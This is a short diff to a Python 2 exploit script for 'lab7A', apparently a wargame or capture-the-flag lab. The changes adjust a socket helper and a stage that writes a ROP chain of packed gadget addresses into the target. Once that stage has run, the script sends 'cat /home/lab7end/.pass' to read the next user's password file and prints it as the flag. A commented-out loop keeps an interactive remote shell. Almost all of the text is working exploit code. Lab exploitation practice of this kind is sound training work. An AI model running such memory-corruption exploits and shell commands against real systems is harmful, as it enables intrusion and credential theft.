@@ -18,7 +18,6 @@ Exploit for level lab7A
 
 import socket
 import struct
-import threading
 import time
 
 
@@ -55,13 +54,15 @@ g5 = 0x08048ef6
 ###############
 
 
-def sendrecv(s, buf):
+def sendrecv(s, buf, rec=True):
     '''
     Sends raw data to the remote process and returns it's output.
     '''
     s.sendall(buf)
-    time.sleep(0.01)
-    return s.recv(1024)
+    time.sleep(0.02)
+    if rec:
+        return s.recv(1024)
+    return None
 
 
 if __name__ == '__main__':
@@ -142,8 +143,7 @@ if __name__ == '__main__':
         print '[STAGE 3] COR filled with the ROP chain'
         sendrecv(s, '4\n')
         sendrecv(s, '1AAA'+struct.pack('<I', coraddr) +
-                 struct.pack('<I', g2)+'\n')
-        time.sleep(0.1)
+                 struct.pack('<I', g2)+'\n', False)
         flag = sendrecv(s, 'cat /home/lab7end/.pass\n')
 
         if not flag:
@@ -152,6 +152,7 @@ if __name__ == '__main__':
             print '[STAGE 3] STAGE 3 COMPLETED! lab7A pwned'
             print '[+] flag : %s' % flag
 
+        # Uncomment this to keep the shell
         # while True:
         #    print sendrecv(s, raw_input('(shell) ')+'\n')
 
